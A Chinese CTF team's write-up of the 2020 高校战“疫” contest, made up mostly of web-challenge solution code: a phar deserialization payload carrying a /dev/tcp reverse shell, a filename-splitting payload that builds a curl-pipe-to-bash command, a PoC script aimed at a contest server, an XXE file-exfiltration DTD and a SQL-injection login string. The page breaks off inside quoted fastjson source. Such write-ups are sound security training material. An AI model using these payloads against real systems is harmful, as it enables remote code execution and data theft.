<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>高校战“疫”网络安全分享赛 2020 SU Write Up -</title><meta name=description content="本次高校战“疫”网络安全分享赛我们 SU 取得了 第十七名 的成绩，感谢队里师傅们的辛苦付出！
以下是我们 SU 本次 高校战“疫”网络安全分享赛的 writeup。"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/gxzyctf-2020-su-wu\/","name":"高校战“疫”网络安全分享赛 2020 su write up"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"高校战“疫”网络安全分享赛 2020 SU Write Up","description":"本次高校战“疫”网络安全分享赛我们 SU 取得了 第十七名 的成绩，感谢队里师傅们的辛苦付出！\n以下是我们 SU 本次 高校战“疫”网络安全分享赛的 writeup。\n","inLanguage":"en","wordCount":3043,"datePublished":"2020-03-10T12:35:50\u002b00:00","dateModified":"2020-03-10T12:35:50\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["OtherCTF"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/gxzyctf-2020-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="高校战“疫”网络安全分享赛 2020 SU Write Up"><meta property="og:description" content="本次高校战“疫”网络安全分享赛我们 SU 取得了 第十七名 的成绩，感谢队里师傅们的辛苦付出！
以下是我们 SU 本次 高校战“疫”网络安全分享赛的 writeup。"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/gxzyctf-2020-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="高校战“疫”网络安全分享赛 2020 SU Write Up"><meta name=twitter:description content="本次高校战“疫”网络安全分享赛我们 SU 取得了 第十七名 的成绩，感谢队里师傅们的辛苦付出！
以下是我们 SU 本次 高校战“疫”网络安全分享赛的 writeup。"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href=https://su-team.cn/css/codeblock.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>高校战“疫”网络安全分享赛 2020 SU Write Up</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on March 10, 100350
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;15&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;3043&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><ul><li><a href=#web>Web</a><ul><li><a href=#php-uaf>PHP UAF</a></li><li><a href=#webct>webct</a></li><li><a href=#sqlcheckin>sqlcheckin</a></li><li><a href=#webtmp>webtmp</a></li><li><a href=#hackme>hackme</a></li><li><a href=#baby_java>baby_java</a></li><li><a href=#fmkq>fmkq</a></li><li><a href=#nothardweb>NothardWeb</a></li><li><a href=#easyweb>easyweb</a></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><a href=#musl>musl</a></li><li><a href=#easyheap>easyheap</a></li><li><a href=#woodenbox2>woodenbox2</a></li><li><a href=#babyhacker>babyhacker</a></li><li><a href=#babyhacker2>babyhacker2</a></li><li><a href=#bjut>bjut</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#2019-ncov>2019-nCoV</a></li><li><a href=#简单misc>简单MISC</a></li><li><a href=#隐藏的信息>隐藏的信息</a></li></ul></li><li><a href=#rev>Rev</a><ul><li><a href=#fxck>fxck!</a></li><li><a href=#cycle-graph>cycle graph</a></li><li><a href=#天津垓>天津垓</a></li><li><a href=#easyparser>easyparser</a></li></ul></li><li><a href=#crypto>Crypto</a></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>本次高校战“疫”网络安全分享赛我们 SU 取得了 第十七名 的成绩，感谢队里师傅们的辛苦付出！</p><p>以下是我们 SU 本次 高校战“疫”网络安全分享赛的 writeup。</p><h2 id=web>Web</h2><h3 id=php-uaf>PHP UAF</h3><p><a href=https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php>https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p><h3 id=webct>webct</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;test.phar&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;phar.readonly&#39;</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$phar</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s2>&#34;test.phar&#34;</span><span class=p>);</span> <span class=c1>//后缀名必须为phar
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setStub</span><span class=p>(</span><span class=s2>&#34;GIF89a&#34;</span> <span class=o>.</span> <span class=s2>&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class=p>);</span> <span class=c1>//设置stub
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Listfile</span><span class=p>(</span><span class=s1>&#39;/ &amp;&amp; bash -c &#34;sh &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#34;&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$o</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Fileupload</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$o</span><span class=p>);</span> <span class=c1>//将自定义的meta-data存入manifest
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s2>&#34;test.txt&#34;</span><span class=p>,</span> <span class=s2>&#34;test&#34;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>    <span class=c1>//签名自动计算
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
</span></span></code></pre></td></tr></table></div></div><p>上 rogue mysql 配合上传的 jpg，用<code>phar</code>触发反序列化。</p><h3 id=sqlcheckin>sqlcheckin</h3><p><code>username=admini&amp;password='-0-'</code></p><h3 id=webtmp>webtmp</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Y19fbWFpbl9fCnNlY3JldApwMAowZzAKKH0oUyduYW1lJwpTJ2FzZCcKZHRiZzAKKH0oUydjYXRlZ29yeScKUycxMjMnCmR0YoAElT0AAAAAAAAAjAhfX21haW5fX5SMBkFuaW1hbJSTlCmBlH2UKIwEbmFtZZSMA2FzZJSMCGNhdGVnb3J5lIwDMTIzlHViLg==
</span></span></code></pre></td></tr></table></div></div><p>直接改secret</p><h3 id=hackme>hackme</h3><p>payload.txt</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&gt;dir
</span></span><span class=line><span class=cl>&gt;sl
</span></span><span class=line><span class=cl>&gt;g\&gt;
</span></span><span class=line><span class=cl>&gt;ht-
</span></span><span class=line><span class=cl>*&gt;v
</span></span><span class=line><span class=cl>&gt;rev
</span></span><span class=line><span class=cl>*v&gt;x
</span></span><span class=line><span class=cl>&gt;sh
</span></span><span class=line><span class=cl>&gt;ba\
</span></span><span class=line><span class=cl>&gt;\%7C\
</span></span><span class=line><span class=cl>&gt;51\
</span></span><span class=line><span class=cl>&gt;0.\
</span></span><span class=line><span class=cl>&gt;13\
</span></span><span class=line><span class=cl>&gt;1.\
</span></span><span class=line><span class=cl>&gt;6\
</span></span><span class=line><span class=cl>&gt;2.\
</span></span><span class=line><span class=cl>&gt;18\
</span></span><span class=line><span class=cl>&gt;\%20\
</span></span><span class=line><span class=cl>&gt;rl\
</span></span><span class=line><span class=cl>&gt;cu\
</span></span><span class=line><span class=cl>sh%20x
</span></span><span class=line><span class=cl>sh%20g
</span></span></code></pre></td></tr></table></div></div><p>poc.py</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=c1>#!/usr/bin/env python</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>requests</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>time</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>req</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://121.36.222.22:88/core/&#39;</span>
</span></span><span class=line><span class=cl><span class=n>url1</span> <span class=o>=</span> <span class=s1>&#39;http://121.36.222.22:88/upload_sign.php&#39;</span>
</span></span><span class=line><span class=cl><span class=n>post1</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;sign&#34;</span><span class=p>:</span><span class=s1>&#39;|O:4:&#34;info&#34;:2:{s:5:&#34;admin&#34;;i:1;s:4:&#34;sign&#34;;s:2:&#34;ls&#34;;}&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;compress.zlib://data:@127.0.0.1/888?,{}&#34;</span>
</span></span><span class=line><span class=cl><span class=n>req</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url1</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>post1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>text</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>)</span><span class=o>.</span><span class=n>content</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>len</span><span class=p>(</span><span class=n>text</span><span class=p>)</span><span class=o>&lt;</span><span class=mi>15</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+]start attack!!!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>with</span> <span class=n>open</span><span class=p>(</span><span class=s2>&#34;payload.txt&#34;</span><span class=p>,</span><span class=s2>&#34;r&#34;</span><span class=p>)</span> <span class=n>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span><span class=o>=</span><span class=n>i</span><span class=o>.</span><span class=n>rstrip</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1>#print(payload.format(i))</span>
</span></span><span class=line><span class=cl>        <span class=n>post_payload</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;url&#34;</span><span class=p>:</span><span class=n>payload</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>post_payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>text</span> <span class=o>=</span> <span class=n>req</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>post_payload</span><span class=p>)</span><span class=o>.</span><span class=n>content</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>len</span><span class=p>(</span><span class=n>text</span><span class=p>)</span><span class=o>&gt;</span><span class=mi>42</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+]&#34;</span><span class=o>+</span><span class=n>payload</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>+</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=baby_java>baby_java</h3><p>有个直接可以反射出来的点, 但是长度有限制, 最多读读 /etc/hostname, 这里采用 ftp xxe 读 /hint.txt</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!ENTITY % data SYSTEM &#34;file:///hint.txt&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % all &#34;&lt;!ENTITY exfil SYSTEM &#39;ftp://somewhere.someplace:19132/%data;&#39;&gt;</span>&#34;&gt;
</span></span><span class=line><span class=cl>%all;
</span></span></code></pre></td></tr></table></div></div><p>之后在 payload 里面引用一下这个 dtd 就行了.<br>hint.txt 里面写了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Method%uFF1A post  
</span></span><span class=line><span class=cl>Path %uFF1A /you_never_know_the_path
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...pom.xml
</span></span></code></pre></td></tr></table></div></div><p>里面有 fastjson-1.2.48, commons-collections-3.1, commons-configuration-1.6. 可以猜到基本上是 fastjson -> ldap -> 本地 gadget 反序列化.<br>直接打会有 waf 拦截, 会拦掉 &ldquo;type&rdquo; 和 &ldquo;prefix&rdquo;, &ldquo;\u&rdquo;, 这里看 fastjson 源码发现</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>scanString</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>           </span><span class=n>np</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>bp</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>           </span><span class=n>hasSpecial</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>           </span><span class=kt>char</span><span class=w> </span><span class=n>ch</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>           </span><span class=k>for</span><span class=w> </span><span class=p>(;;)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>               </span><span class=n>ch</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>next</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   
</span></span></span><span class=line><span class=cl><span class=w>               </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>ch</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=sc>&#39;\&#34;&#39;</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                   </span><span class=k>break</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>               </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   
</span></span></span><span class=line><span class=cl><span class=w>               </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>ch</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>EOI</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                   </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>isEOF</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                       </span><span class=n>putChar</span><span class=p>((</span><span class=kt>char</span><span class=p>)</span><span class=w> </span><span class=n>EOI</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                       </span><span class=k>continue</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                   </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                   </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>JSONException</span><span class=p>(</span><span class=s>&#34;unclosed string : &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>ch</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>               </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>   
